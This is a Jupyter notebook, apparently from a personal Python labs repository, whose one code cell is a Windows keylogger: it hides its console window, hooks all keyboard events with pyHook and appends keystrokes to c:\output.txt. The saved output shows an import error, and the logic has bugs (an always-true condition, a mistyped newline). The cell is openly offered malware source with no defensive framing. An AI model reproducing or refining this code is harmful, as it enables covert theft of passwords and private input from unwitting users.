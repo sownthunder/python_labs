{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'win32api'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-3-4aa478d2abd2>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;31m# Python code for keylogger\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;31m# to be used in windows\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[0;32mimport\u001b[0m \u001b[0mwin32api\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      4\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mwin32console\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mwin32gui\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mModuleNotFoundError\u001b[0m: No module named 'win32api'"
     ]
    }
   ],
   "source": [
    "# Python code for keylogger \n",
    "# to be used in windows \n",
    "import win32api \n",
    "import win32console \n",
    "import win32gui \n",
    "import pythoncom, pyHook \n",
    "\n",
    "win = win32console.GetConsoleWindow() \n",
    "win32gui.ShowWindow(win, 0) \n",
    "\n",
    "def OnKeyboardEvent(event): #{\n",
    "    if event.Ascii==5: #{\n",
    "        _exit(1) \n",
    "    #}\n",
    "    if event.Ascii !=0 or 8: #{\n",
    "    #open output.txt to read current keystrokes \n",
    "        f = open('c:\\output.txt', 'r+') \n",
    "        buffer = f.read() \n",
    "        f.close() \n",
    "    # open output.txt to write current + new keystrokes \n",
    "        f = open('c:\\output.txt', 'w') \n",
    "        keylogs = chr(event.Ascii) \n",
    "        if event.Ascii == 13: #{\n",
    "            keylogs = '/n'\n",
    "            buffer += keylogs \n",
    "            f.write(buffer) \n",
    "            f.close() \n",
    "        #}\n",
    "    #}\n",
    "# create a hook manager object \n",
    "hm = pyHook.HookManager() \n",
    "hm.KeyDown = OnKeyboardEvent \n",
    "# set the hook \n",
    "hm.HookKeyboard() \n",
    "# wait forever \n",
    "pythoncom.PumpMessages() \n",
    " "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
